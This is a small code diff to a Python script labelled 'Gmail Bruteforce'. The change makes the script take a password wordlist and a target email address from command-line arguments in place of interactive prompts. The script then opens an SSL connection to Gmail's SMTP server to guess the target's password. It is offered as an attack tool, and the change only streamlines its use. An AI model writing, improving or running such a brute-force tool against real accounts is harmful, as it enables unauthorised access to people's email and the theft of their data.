@@ -6,17 +6,18 @@ import time
 global logFile
 logFile = 'Password_Log.txt'
 
+global target
+global passfile
+target = sys.argv[2]
+passfile = sys.argv[1]
+
 def hacks():
     system("clear")
     print("---==[ Gmail Bruteforce ]==---")
-
-    passfile = raw_input("[-]Password File Address: ")
-
     pass_file = open(passfile,"r")
     pass_list = pass_file.readlines()
 
     i = 0
-    target = raw_input("[-]Target's Address: ")
     gmail = smtplib.SMTP_SSL('smtp.gmail.com', 465)
     gmail.ehlo()
 
